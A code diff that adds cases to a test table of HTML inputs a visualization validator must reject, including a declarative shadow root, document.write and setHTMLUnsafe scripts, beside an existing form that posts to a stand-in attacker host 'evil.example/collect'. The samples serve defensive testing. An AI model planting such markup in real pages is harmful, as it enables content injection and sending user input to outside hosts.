@@ -57,6 +57,13 @@ describe("validateVisualization rejects", () => {
     ],
     [
       "external-url",
+      "a declarative shadow root",
+      '<div><template shadowrootmode="closed"><p>x</p></template></div>',
+    ],
+    ["external-url", "document.write", "<script>document.write(markup);</script>"],
+    ["external-url", "setHTMLUnsafe", "<script>host.setHTMLUnsafe(markup);</script>"],
+    [
+      "external-url",
       "a form action",
       '<form action="https://evil.example/collect"><input name=q></form>',
     ],
